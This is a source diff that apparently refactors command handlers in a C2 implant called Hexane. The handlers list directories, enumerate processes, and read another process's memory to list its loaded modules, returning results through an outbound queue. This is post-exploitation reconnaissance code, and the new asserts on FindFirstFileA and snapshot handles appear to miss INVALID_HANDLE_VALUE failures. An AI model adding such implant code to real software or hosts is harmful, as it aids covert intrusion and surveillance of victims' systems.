@@ -15,26 +15,24 @@ namespace Commands {
         HEXANE
 
         _stream *out = Stream::CreateStreamWithHeaders(TypeResponse);
-        Stream::PackDword(out, DIRECTORYLIST);
 
         ULONG length    = { };
         LPSTR query     = { };
         LPSTR path      = { };
 
-        WIN32_FIND_DATAA head       = { };
-        ULARGE_INTEGER file_size    = { };
-        SYSTEMTIME access_time      = { };
-        SYSTEMTIME sys_time         = { };
-        HANDLE file                 = { };
+        HANDLE              file        = { };
+        WIN32_FIND_DATAA    head        = { };
+        ULARGE_INTEGER      file_size   = { };
+        SYSTEMTIME          access_time = { };
+        SYSTEMTIME          sys_time    = { };
 
-
-        query = Parser::UnpackString(parser, nullptr);
-        path = R_CAST(char*, x_malloc(MAX_PATH));
+        Stream::PackDword(out, DIRECTORYLIST);
+        query   = Parser::UnpackString(parser, nullptr);
+        path    = R_CAST(char*, x_malloc(MAX_PATH));
 
         if (query[0] == PERIOD) {
-            if (!(length = Ctx->win32.GetCurrentDirectoryA(MAX_PATH, path))) {
-                return_defer(ERROR_DIRECTORY);
-            }
+            x_assert(length = Ctx->win32.GetCurrentDirectoryA(MAX_PATH, path));
+
             if (path[length - 1] != BSLASH) {
                 path[length++] = BSLASH;
             }
@@ -45,16 +43,11 @@ namespace Commands {
             x_memcpy(path, query, MAX_PATH);
         }
 
-        if ((file = Ctx->win32.FindFirstFileA(path, &head)) == INVALID_HANDLE_VALUE) {
-            return_defer(ERROR_FILE_NOT_FOUND);
-        }
+        x_assert(file = Ctx->win32.FindFirstFileA(path, &head));
 
         do {
-            if(
-                !Ctx->win32.FileTimeToSystemTime(&head.ftLastAccessTime, &access_time) ||
-                !Ctx->win32.SystemTimeToTzSpecificLocalTime(nullptr, &access_time, &sys_time)) {
-                return_defer(ERROR_INVALID_TIME);
-            }
+            x_assert(Ctx->win32.FileTimeToSystemTime(&head.ftLastAccessTime, &access_time));
+            x_assert(Ctx->win32.SystemTimeToTzSpecificLocalTime(nullptr, &access_time, &sys_time));
 
             if (head.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                 Stream::PackDword(out, TRUE);
@@ -104,28 +97,20 @@ namespace Commands {
         INT count = 0;
         SIZE_T size = 0;
 
-
-        if (
-            !(pid = Process::GetProcessIdByName(Parser::UnpackString(parser, nullptr))) ||
-            !NT_SUCCESS(Process::NtOpenProcess(&process, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, pid))) {
-            return_defer(ERROR_PROCESS_IS_PROTECTED);
-        }
+        x_assert(pid = Process::GetProcessIdByName(Parser::UnpackString(parser, nullptr)));
+        x_ntassert(Process::NtOpenProcess(&process, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, pid));
 
         if (NT_SUCCESS(Ctx->nt.NtQueryInformationProcess(process, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), nullptr)) ) {
-
-            if (
-                !NT_SUCCESS(Ctx->nt.NtReadVirtualMemory(process, &pbi.PebBaseAddress->Ldr, &loads, sizeof(PPEB_LDR_DATA), &size)) ||
-                !NT_SUCCESS(Ctx->nt.NtReadVirtualMemory(process, &loads->InMemoryOrderModuleList.Flink, &entry, sizeof(PLIST_ENTRY), nullptr))) {
-                return_defer(ntstatus);
-            }
+            x_ntassert(Ctx->nt.NtReadVirtualMemory(process, &pbi.PebBaseAddress->Ldr, &loads, sizeof(PPEB_LDR_DATA), &size));
+            x_ntassert(Ctx->nt.NtReadVirtualMemory(process, &loads->InMemoryOrderModuleList.Flink, &entry, sizeof(PLIST_ENTRY), nullptr));
 
             head = &loads->InMemoryOrderModuleList;
             while (entry != head) {
-                if (
-                    !NT_SUCCESS(Ctx->nt.NtReadVirtualMemory(process, CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks), &module, sizeof(LDR_DATA_TABLE_ENTRY), nullptr)) ||
-                    !NT_SUCCESS(Ctx->nt.NtReadVirtualMemory(process, module.FullDllName.Buffer, &modname_w, module.FullDllName.Length, &size)) ||
-                    size != module.FullDllName.Length) {
-                    return_defer(ntstatus);
+                x_ntassert(Ctx->nt.NtReadVirtualMemory(process, CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks), &module, sizeof(LDR_DATA_TABLE_ENTRY), nullptr));
+                x_ntassert(Ctx->nt.NtReadVirtualMemory(process, module.FullDllName.Buffer, &modname_w, module.FullDllName.Length, &size));
+
+                if (size != module.FullDllName.Length) {
+                    goto defer;
                 }
 
                 if (module.FullDllName.Length > 0) {
@@ -168,11 +153,9 @@ namespace Commands {
         Size            = ARRAY_LEN(buffer);
         entries.dwSize  = sizeof(PROCESSENTRY32);
 
-        if (
-            (snapshot = Ctx->win32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)) == INVALID_HANDLE_VALUE ||
-            !Ctx->win32.Process32First(snapshot, &entries)) {
-            return;
-        }
+        x_assert(snapshot = Ctx->win32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0));
+        x_assert(Ctx->win32.Process32First(snapshot, &entries));
+
         do {
             BOOL is_managed  = FALSE;
             BOOL is_loaded   = FALSE;
@@ -219,6 +202,8 @@ namespace Commands {
         } while (Ctx->win32.Process32Next(snapshot, &entries));
 
         Dispatcher::OutboundQueue(out);
+
+        defer:
         if (snapshot) {
             Ctx->nt.NtClose(snapshot);
         }
